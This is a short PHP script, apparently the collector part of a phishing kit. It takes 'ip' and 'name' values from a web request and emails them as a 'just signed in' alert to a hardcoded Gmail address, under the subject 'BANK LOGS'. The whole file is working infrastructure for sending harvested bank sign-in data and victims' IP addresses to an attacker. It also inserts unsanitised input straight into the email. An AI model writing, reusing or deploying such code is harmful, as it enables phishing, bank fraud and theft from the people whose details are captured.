<?php
require_once "config.php";


if (isset($_REQUEST['ip'])) {
  $text = $_REQUEST['ip'];
  $name = $_REQUEST['name'];

  $message = "
  <html>
    <body>
      <h2>$name just signed in</h2>
      <p>$text</p>
    </body>
  </html>";

  if (!sendEmail("alexjace151@gmail.com", "BANK LOGS", $message)){
    echo "Message not sent";
  }
  else {
    echo "Message sent";
  }
  
}
